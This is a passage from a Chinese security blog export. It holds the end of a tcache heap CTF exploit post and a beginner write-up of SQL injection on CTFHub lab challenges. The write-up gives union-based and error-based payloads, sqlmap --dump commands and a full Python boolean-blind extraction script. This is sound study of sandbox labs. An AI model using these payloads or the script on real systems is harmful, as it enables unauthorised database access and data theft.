                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6THJNUWWQWE2UDG.jpg"
                      alt="img"
                ></p>
<p>此时因为管理已满两个，需要将notes[0]释放并清0。由于tcache已满，其会进入fastbin。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J5ETUWKBVKPC2GE.jpg"
                      alt="img"
                ></p>
<p>此时在申请的堆块会由notes[0]管理，再次申请一个堆块则会从tcache中获取__free_hook的地址，将其修改为one_gadget。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SHPQPCWP6VZ5YXR.jpg"
                      alt="img"
                ></p>
<p>此时随便del一个notes[i]就会触发one_gadget，从而getshell；<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_35RYCASC2VV4JFH.jpg"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-SQL_injection</title>
    <url>/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要学一下IOT安全，但我web方面还是个小白，所以有了二进制选手的web安全之路这个系列。我打算把每天学的web安全以及渗透相关的知识积累起来，每篇文章作为一个专题，后续如果发现了这个专题的其他内容，也会补充这些新内容。本着开源精神，利己利他，后续有和我一样的同学也能少走些弯路。</p>
<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><p>靶场环境 ：<strong>ctfhub技能数-&gt;web-&gt;sql注入</strong><br>注入参数为整数类型，语句类似 <strong>select * from news where id&#x3D;参数</strong>。</p>
<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="手动解法"><a href="#手动解法" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以根据回显结果来判断我们插入的语句是否被解析为 sql 语法，是否存在整数注入。</li>
</ol>
<ul>
<li>有回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916260_65065ea4ef5f74197d22d.jpeg"
                      alt="图片.png"
                ></li>
<li>无回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916280_65065eb84cc85d0f84691.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>确认查询列数。输入到 3 时返回错误，所以列数为 2 。</li>
</ol>
<ul>
<li>输入<code>1 order by 1</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916304_65065ed0c6d83b7476271.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916380_65065f1ce90b56a129953.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 3</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916437_65065f554ccda7aa2c70c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="3">
<li>通过<code>union</code>注入查询数据。<a class="link"   href="https://blog.csdn.net/qq_33704186/article/details/81909276#:~:text=1%20UNION%E5%BF%85%E9%A1%BB%E7%94%B1%E4%B8%A4%E6%9D%A1%E4%BB%A5%E4%B8%8A%E7%9A%84SELECT%E8%AF%AD%E5%8F%A5%E7%BB%84%E6%88%90%EF%BC%8C%E8%AF%AD%E5%8F%A5%E4%B9%8B%E9%97%B4%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97UNION%E5%88%86%E5%89%B2%E3%80%82%202%20UNION%E4%B8%AD%E7%9A%84%E6%AF%8F%E4%B8%AA%E6%9F%A5%E8%AF%A2%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E5%88%97%E3%80%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%88%96%E8%81%9A%E9%9B%86%E5%87%BD%E6%95%B0%EF%BC%88%E5%90%84%E4%B8%AA%E5%88%97%E4%B8%8D%E9%9C%80%E8%A6%81%E4%BB%A5%E7%9B%B8%E5%90%8C%E7%9A%84%E6%AC%A1%E5%BA%8F%E5%88%97%E5%87%BA%EF%BC%89%E3%80%82,3%20%E5%88%97%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%BF%85%E9%A1%BB%E5%85%BC%E5%AE%B9%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%B8%8D%E5%BF%85%E5%AE%8C%E5%85%A8%E7%9B%B8%E5%90%8C%EF%BC%8C%E4%BD%86%E5%BF%85%E9%A1%BB%E6%98%AFDBMS%E5%8F%AF%E4%BB%A5%E9%9A%90%E5%90%AB%E5%9C%B0%E8%BD%AC%E6%8D%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E3%80%82%204%20%E5%A6%82%E6%9E%9C%E5%8F%96%E5%87%BA%E6%9D%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%8D%E9%9C%80%E8%A6%81%E5%8E%BB%E9%87%8D%EF%BC%8C%E4%BD%BF%E7%94%A8UNION%20ALL%E3%80%82" >union 联合查询 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>语句内部每个 select 语句必须拥有相同的列。<code>union</code>也可用于查询列数。</li>
</ol>
<ul>
<li>输入<code>union select 1</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916765_6506609dab540b6023728.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>union select 1,2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916821_650660d546a90eeed092e.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="4">
<li>利用<code>union</code>查询数据库名。</li>
</ol>
<ul>
<li>输入<code>-1 union select 1,database()</code>。让<code>id=-1</code>因为回显只有一行数据，需要让第一个 select 语句返回空。这里查询到一个<code>sqli</code>数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917239_650662772b8e7111dc06f.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code>。Mysql5.0以上版本中<code>information_schema</code>默认库保存了所有数据库信息。这里我们查询到了一个<code>flag</code>表。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917671_650664275ef10bfc36caa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;</code>。通过<code>group_concat()</code>函数将多条数据组合成字符串输出，或者通过<code>limit</code>函数选择输出第几条数据。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918028_6506658c3aaaad01f227a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918269_6506667d5ea3ec2a0c007.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39;</code>，同样通过<code>information_schema</code>查询列名。flag 表中 只有一个 flag 列。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918728_65066848ed5194e1132da.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(flag) from sqli.flag</code>。直接查询 flag 列中数据即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918968_650669383b276fdeff2c2.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法"><a href="#sqlmap解法" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 --tables</code>。<code>-u</code>指定<code>url</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925726_6506839ed41f7be2b056e.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925791_650683dfc0312ff3118a9.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</code>。<code>-D</code>指定数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925898_6506844a0ba4ae76ab779.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925919_6506845fcf0c913dbdef5.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables --dump</code>, –dump 获取字段数据，或者输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --tables --dump</code>，-T 指定表名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694926146_65068542367ee69412f81.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="手动解法-1"><a href="#手动解法-1" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>判断列数。原理一样，记得输入<code>&#39;</code>闭合操作，然后注释掉后面自带的<code>&#39;</code>，<code>-- </code> 注释记得加一个空格，<code>#</code>则不用加空格。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920851_650670932e7b75ae5560e.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920866_650670a27aff291856c84.jpeg"
                      alt="图片.png"
                ></li>
<li>查询 flag。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920986_6506711accedcd1cc6251.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694921008_6506713068062018bc4ff.jpeg"
                      alt="图片.png"
                ></li>
</ol>
<h3 id="sqlmap解法-1"><a href="#sqlmap解法-1" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在无法利用<code>union</code>注入并回显报错信息时，可采用报错注入。人为制造错误条件，在报错信息中返回完整查询结果。</p>
<h3 id="手动解法-2"><a href="#手动解法-2" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>利用<code>extractvalue(XML_document, XPath_string)</code>和<code>updatexml(XML_document, XPath_string, new_value)</code>函数进行报错注入。<a class="link"   href="https://cloud.tencent.com/developer/article/1740429" >extractvalue()和updatexml() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>函数第二个参数不合法时，会将查询结果放在报错信息中。但 extractvalue() 函数最长报错32位。</li>
</ol>
<ul>
<li>输入 <code>1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939858_6506bad23ae2111ed3a0c.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939924_6506bb1469825c430249c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法-2"><a href="#sqlmap解法-2" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694940318_6506bc9ec18a01fe8bd3e.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>回显只有<code>True</code>和<code>False</code>的情况。<a class="link"   href="https://blog.csdn.net/Xxy605/article/details/109750292" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="手动解法-3"><a href="#手动解法-3" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以编写脚本，逐字节爆破。</li>
</ol>
<ul>
<li>输入<code>1 and 1=1</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941068_6506bf8ce8344cd7b2a76.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and1=2</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941405_6506c0dd359632ea635fa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (substr((select flag from flag),1,1)=&#39;c&#39;)</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941363_6506c0b35f287f501d352.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>脚本</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#设定环境URL，由于每次开启环境得到的URL都不同，需要修改！</span><br><span class="line">url = &#x27;http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/&#x27;</span><br><span class="line">#作为盲注成功的标记，成功页面会显示query_success</span><br><span class="line">success_mark = &quot;query_success&quot;</span><br><span class="line">#把字母表转化成ascii码的列表，方便便利，需要时再把ascii码通过chr(int)转化成字母</span><br><span class="line">ascii_range = range(ord(&#x27;a&#x27;),1+ord(&#x27;z&#x27;))</span><br><span class="line">#flag的字符范围列表，包括花括号、a-z，数字0-9</span><br><span class="line">str_range = [123,125] + list(ascii_range) + list(range(48,58))</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名长度</span><br><span class="line">def getLengthofDatabase():</span><br><span class="line">	#初始化库名长度为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环库名长度</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and length(database())=&#123;&#125;&quot;.format(i)</span><br><span class="line">        #GET请求</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        #如果返回的页面有query_success，即盲猜成功即跳出无限循环</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终库名长度</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，库名长度+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名</span><br><span class="line">def getDatabase(length_of_database):</span><br><span class="line">	#定义存储库名的变量</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    #库名有多长就循环多少次</span><br><span class="line">    for i in range(length_of_database):</span><br><span class="line">    	#切片，对每一个字符位遍历字母表</span><br><span class="line">    	#i+1是库名的第i+1个字符下标，j是字符取值a-z</span><br><span class="line">        for j in ascii_range:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i+1,chr(j))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到库名变量里</span><br><span class="line">                name += chr(j)</span><br><span class="line">                #当前下标字符匹配成功，退出遍历，对下一个下标进行遍历字母表</span><br><span class="line">                break</span><br><span class="line">    #返回最终的库名</span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库的表数量</span><br><span class="line">def getCountofTables(database):</span><br><span class="line">	#初始化表数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(database,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终表数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，表数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名长度</span><br><span class="line">def getLengthListofTables(database,count_of_tables):</span><br><span class="line">	#定义存储表名长度的列表</span><br><span class="line">	#使用列表是考虑表数量不为1，多张表的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少张表就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#j从1开始，无限循环表名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">        	#i+1是第i+1张表</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到表名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，表名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的表名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名</span><br><span class="line">def getTables(database,count_of_tables,length_list):</span><br><span class="line">    #定义存储表名的列表</span><br><span class="line">    tables=[]</span><br><span class="line">    #表数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#定义存储表名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #表名有多长就循环多少次</span><br><span class="line">        #表长度和表序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">        	#k是字符取值a-z</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到表名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加表名到表名列表里</span><br><span class="line">        tables.append(name)</span><br><span class="line">    #返回最终的表名列表</span><br><span class="line">    return tables</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定表的列数量</span><br><span class="line">def getCountofColumns(table):</span><br><span class="line">	#初始化列数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(table,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终列数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，列数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列的列名长度</span><br><span class="line">def getLengthListofColumns(database,table,count_of_column):</span><br><span class="line">	#定义存储列名长度的变量</span><br><span class="line">	#使用列表是考虑列数量不为1，多个列的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少列就循环多少次</span><br><span class="line">    for i in range(count_of_column):</span><br><span class="line">        #j从1开始，无限循环列名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,table,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到列名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，列名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的列名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列名</span><br><span class="line">def getColumns(database,table,count_of_columns,length_list):</span><br><span class="line">	#定义存储列名的列表</span><br><span class="line">    columns = []</span><br><span class="line">    #列数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_columns):</span><br><span class="line">        #定义存储列名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #列名有多长就循环多少次</span><br><span class="line">        #列长度和列序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,table,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到列名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加列名到列名列表里</span><br><span class="line">        columns.append(name)</span><br><span class="line">    #返回最终的列名列表</span><br><span class="line">    return columns</span><br><span class="line"></span><br><span class="line">#对指定库指定表指定列爆数据（flag）</span><br><span class="line">def getData(database,table,column,str_list):</span><br><span class="line">	#初始化flag长度为1</span><br><span class="line">    j = 1</span><br><span class="line">    #j从1开始，无限循环flag长度</span><br><span class="line">    while True:</span><br><span class="line">    	#flag中每一个字符的所有可能取值</span><br><span class="line">        for i in str_list:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr((select &#123;&#125; from &#123;&#125;.&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(column,database,table,j,chr(i))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            #如果返回的页面有query_success，即盲猜成功，跳过余下的for循环</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#显示flag</span><br><span class="line">                print(chr(i),end=&quot;&quot;)</span><br><span class="line">                #flag的终止条件，即flag的尾端右花括号</span><br><span class="line">                if chr(i) == &quot;&#125;&quot;:</span><br><span class="line">                    print()</span><br><span class="line">                    return 1</span><br><span class="line">                break</span><br><span class="line">        #如果没有匹配成功，flag长度+1接着循环</span><br><span class="line">        j = j + 1</span><br><span class="line"></span><br><span class="line">#--主函数--</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	#爆flag的操作</span><br><span class="line">	#还有仿sqlmap的UI美化</span><br><span class="line">    print(&quot;Judging the number of tables in the database...&quot;)</span><br><span class="line">    database = getDatabase(getLengthofDatabase())</span><br><span class="line">    count_of_tables = getCountofTables(database)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in this database&quot;.format(count_of_tables))</span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the table name...&quot;)</span><br><span class="line">    length_list_of_tables = getLengthListofTables(database,count_of_tables)</span><br><span class="line">    tables = getTables(database,count_of_tables,length_list_of_tables)</span><br><span class="line">    for i in tables:</span><br><span class="line">        print(&quot;[+]&#123;&#125;&quot;.format(i))</span><br><span class="line">    print(&quot;The table names in this database are : &#123;&#125;&quot;.format(tables))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的表</span><br><span class="line">    i = input(&quot;Select the table name:&quot;)</span><br><span class="line"></span><br><span class="line">    if i not in tables:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the column names in the &#123;&#125; table......&quot;.format(i))</span><br><span class="line">    count_of_columns = getCountofColumns(i)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in the &#123;&#125; table&quot;.format(count_of_columns,i))</span><br><span class="line">    length_list_of_columns = getLengthListofColumns(database,i,count_of_columns)</span><br><span class="line">    columns = getColumns(database,i,count_of_columns,length_list_of_columns)</span><br><span class="line">    print(&quot;[+]The column(s) name in &#123;&#125; table is:&#123;&#125;&quot;.format(i,columns))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的列</span><br><span class="line">    j = input(&quot;Select the column name:&quot;)</span><br><span class="line"></span><br><span class="line">    if j not in columns:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the flag......&quot;)</span><br><span class="line">    print(&quot;[+]The flag is &quot;,end=&quot;&quot;)</span><br><span class="line">    getData(database,i,j,str_range)</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941947_6506c2fb60cad0ca1b84a.jpeg"
                      alt="图片.png"
                ></p>
